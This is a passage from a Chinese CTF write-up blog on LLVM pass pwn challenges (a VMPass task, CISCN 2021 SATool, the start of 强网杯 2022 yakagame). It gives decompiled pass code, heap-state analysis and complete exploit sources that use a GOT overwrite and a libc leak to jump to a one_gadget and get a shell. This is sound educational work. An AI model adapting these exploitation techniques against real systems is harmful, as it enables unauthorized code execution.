class="line">&#125;</span><br></pre></td></tr></table></figure><p>学过<code>VMpwn</code>的师傅会发现，这里可以很容易的实现任意地址写<br>我们前面<code>checksec</code>发现<code>opt-8</code>并没有开启<code>PIE</code>保护以及<code>got</code>表可写。通过分析，在该关键函数每论循环结束时都会执行<code>free</code>函数，于是我们可以选择修改”寄存器”的值为<code>got</code>表地址，然后将里面的值读进”寄存器”，然后再利用<code>add</code>函数将”寄存器”里的<code>free</code>函数改成<code>onegadget</code>，最后写回<code>free</code>的<code>got</code>表中，程序调用<code>free</code>即可执行<code>onegadget</code>。最终的<code>exp</code>如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);  </span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后执行<code>./opt-8 -load ./VMPass.so -VMPass ./exp.ll</code>即可<code>getshell</code><br>由于没有在比赛中遇到过这种题目，所以不知道远程是怎么打的。听别的师傅说，好像和<code>kernel pwn</code>和<code>qemu</code>逃逸一样，都是直接上传一个<code>elf</code>  </p><h2 id="CISCN-2021-SATool"><a href="#CISCN-2021-SATool" class="headerlink" title="[CISCN 2021] SATool"></a>[CISCN 2021] SATool</h2><p>首先还是按照上面的方法定位到被进行修改过的<code>runOnFunction</code>函数为<code>sub_19D0</code>，点开一看<code>500</code>多行代码，直接看的头大，这时候就十分的考验我们对关键代码的定位了<br>首先在最前面  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>((llvm::Value *)a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">8</span> &amp;&amp; *Name == <span class="string">&#x27;r0oDkc4B&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a2[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v4 != (llvm::Value *)(a2 + <span class="number">9</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="type">char</span> *)v4 - <span class="number">24</span>;</span><br><span class="line">        v82 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">          v5 = <span class="number">0LL</span>;</span><br><span class="line">        v6 = *((_QWORD *)v5 + <span class="number">6</span>);</span><br><span class="line">        v7 = v5 + <span class="number">40</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">char</span> *)v6 != v7 )</span><br></pre></td></tr></table></figure><p>从中我们可以看到要一定要有名为<code>B4ckDo0r</code>（小端序）的函数才可以进行后面的操作<br>后面的程序大概可以看出，根据B4ckDo0r中调用不同的函数从而来执行相应的操作，接下来进行详细的分析<br>我们可以观察到如果传入的是<code>run</code>函数，他所执行的程序中存在以下这段代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure><p>这里会执行<code>*byte_2040f8</code>，所以我们想如果可以修改<code>byte_2040f8</code>为<code>one_gadget</code>的地址，执行该段代码时我们就可以<code>getshell</code>了<br>于是对<code>byte_2040f8</code>进行交叉引用，看看什么地方可以对该值进行修改，接下来对能对该地址进行修改的部分代码进行详细分析<br>首先是对<code>fakekey</code>函数的处理,定位到关键部分：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v76 = byte_204100;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br><span class="line">byte_204100 = v76 + SExtValue;</span><br><span class="line">*byte_2040f8 = v76 + SExtValue;</span><br></pre></td></tr></table></figure><p>可以看出该函数可以对<code>*byte_2040f8</code>和<code>byte_204100</code>的值加上一个用户自己定义的数，即<code>*byte_2040f8 = byte_204100 + 用户的value</code><br>接下来分析<code>stealkey</code>的关键部分：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_2040f8</span><br><span class="line">  &amp;&amp; !(<span class="number">-1431655765</span></span><br><span class="line">      * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                      + <span class="number">24</span> * v65</span><br><span class="line">                      - <span class="number">24LL</span> * v66</span><br><span class="line">                      - (v8</span><br><span class="line">                      - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">&#123;</span><br><span class="line">  byte_204100 = *byte_2040f8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会将<code>*byte_2040f8</code>赋值给<code>byte_204100</code><br>最后是对<code>save</code>部分的分析，其有下面这段关键代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((v15 + <span class="number">24</span> * v18 - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)NumTotalBundleOperands - v20) &gt;&gt; <span class="number">3</span>) == <span class="number">2</span> )&#123;</span><br><span class="line">  v21 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v21 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v21 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_143;</span><br><span class="line">    v22 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v23 = v15</span><br><span class="line">      + <span class="number">24</span> * v22</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v24 = (__int64 *)(v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v23 - (_QWORD)v24) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v25 = *v24;</span><br><span class="line">  v26 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v26 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_144;</span><br><span class="line">    v27 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v15</span><br><span class="line">      + <span class="number">24</span> * v27</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v29 = v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v28 - v29) &gt;&gt; <span class="number">3</span>) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>u) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v30 = *(_QWORD *)(v29 + <span class="number">24</span>);</span><br><span class="line">  <span class="built_in">sub_2430</span>(&amp;src, v25);</span><br><span class="line">  <span class="built_in">sub_2430</span>(v84, v30);</span><br><span class="line">  v31 = n;</span><br><span class="line">  v32 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  v32[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">  byte_2040f8 = v32;</span><br><span class="line">  v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  <span class="built_in">memcpy</span>(v32, src, v31);</span><br><span class="line">  v34 = v32 + <span class="number">1</span>;</span><br><span class="line">  v35 = (<span class="type">char</span> *)v84[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">memcpy</span>(v34, v84[<span class="number">0</span>], (<span class="type">size_t</span>)v84[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v35 != &amp;v85 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v35)</span></span>;</span><br><span class="line">    v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v33 != v88 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v33)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行的代码意思是要求<code>save</code>函数要有<code>2</code>个参数，从代码中我们可以看出<code>byte_2040f8</code>指向一个新申请的<code>0x20</code>大小的堆块，而后面的操作看的也不是太懂，因为前面看的也不是很懂，于是用<code>gdb</code>调试了一下，测试脚本：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>gdb</code>中查看<code>byte_2040f8</code>：  </p><img src="/2024/03/15/llvm/4.png" class="" title="我的图图呢">  <p>可以看到<code>byte_2040f8</code>指向一个新<code>malloc</code>的堆块，堆块大小为<code>0x18</code>，堆块的内容为<code>save</code>函数的第一和第二个参数，回到最开始程序刚进入到对<code>save</code>函数的进行处理的时候，我们看看堆块的布局：  </p><img src="/2024/03/15/llvm/5.png" class="" title="我的图图呢"><p>可以看到<code>unsortedbin</code>中存在一个堆块，<code>tcache</code>中有<code>7</code>个<code>0x20</code>大小的堆块，如果我们将<code>7</code>个堆块申请出来，再用<code>save</code>函数申请<code>0x20</code>大小的堆块，堆管理系统则会直接切割<code>unsortedbin</code>中的堆块进行分配，此时申请出来的堆块会残留着之前<code>unsortedbin</code>在<code>fd</code>上有关<code>libc</code>的地址，即我们可以令<code>*byte_2040f8</code>为<code>libc</code>上的一个地址<br>此时我们可利用<code>stealkey</code>函数将<code>*byte_2040f8</code>上的值赋值给<code>byte_204100</code>，代码如下：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：  </p><img src="/2024/03/15/llvm/6.png" class="" title="我的图图呢">  <p>再利用<code>fakekey</code>函数<code>*byte_2040f8 = byte_204100 - one_gadget与byte_204100上有关libc地址的偏移</code>，即可另<code>*byte_2040f8</code>的值为<code>one_gadget</code>的地址，最后使用<code>run</code>函数执行<code>one_gadget</code>直接<code>getshell</code>。最终<code>exp</code>如下：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="built_in">fakekey</span>(<span class="number">-0x1090f2</span>);</span><br><span class="line">    <span class="built_in">run</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="强网杯-2022-yakagame"><a href="#强网杯-2022-yakagame" class="headerlink" title="[强网杯 2022] yakagame"></a>[强网杯 2022] yakagame</h2><p>这道题的<code>PASS</code>注册的名称并不能直接在<code>start</code>函数中找打，看了<code>winmt</code>师傅的文章发现可以对<code>__cxa_atexit</code>函数“交叉引用”来定位，如下图：  </p><img src="/2024/03/15/llvm/7.png" class="" title="我的图图呢">  <p>可以看见<code>PASS</code>注册的名称为<code>ayaka</code>（没事干给<code>ida64</code>换了一个主题哈哈哈）。接下来对主要函数进行分析，用上面题目的方法定位到<code>sub_C880</code>即为重写的<code>runOnFunction</code>函数。<br>还是和之前的方法一样，发现程序主要是对<code>gamestart</code>函数的定义进行分析和操作，接下来详细分析各个部分<br>对<code>fight</code>函数的处理：  </p><img src="/2024/03/15/llvm/8.png" class="" title="我的图图呢">  <p>该函数只能有一个参数，以该参数作为索引，从<code>weaponlist</code>数组中取出一个数<code>v53</code>与<code>boss</code>进行比较：  </p><ul><li>如果<code>v53</code>的值小于<code>boss</code>，则输出<code>loss</code>  </li><li>如果<code>v53</code>的值大于等于<code>boss</code>，则输出<code>win</code>，并进行赋值操作：<code>*score = v53 - boss</code>  </li><li>如果<code>*score &gt; 0x12345678</code>，则会进入<code>backdoor</code>函数</li></ul><p>接下来就看看这个<code>backdoor</code>函数：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">backdoor</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow!! this is you gift&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以想到，如果我们可以控制<code>cmd</code>的值并且执行<code>backdoor</code>函数，我们就能够<code>getshell</code><br>对<code>merge</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;merge&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v52 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v52 != <span class="number">3</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v15 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v15);</span><br><span class="line">  v50 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// 参数一</span></span><br><span class="line">  v16 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">1u</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v16);</span><br><span class="line">  v49 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// 参数二</span></span><br><span class="line">  weaponlist[v50] += weaponlist[v49];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数需要有<code>2</code>个参数，分别为<code>v50</code>和<code>v49</code>，最后进行<code>weaponlist[v50] += weaponlist[v49]</code>操作<br>下面几个函数比较容易看懂且用处不大，就不做分析<br>对<code>destroy</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;destroy&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v47 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v47 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v46 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">  v48 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v46);</span><br><span class="line">  weaponlist[v48] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对<code>upgrade</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;upgrade&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v44 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v44 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span 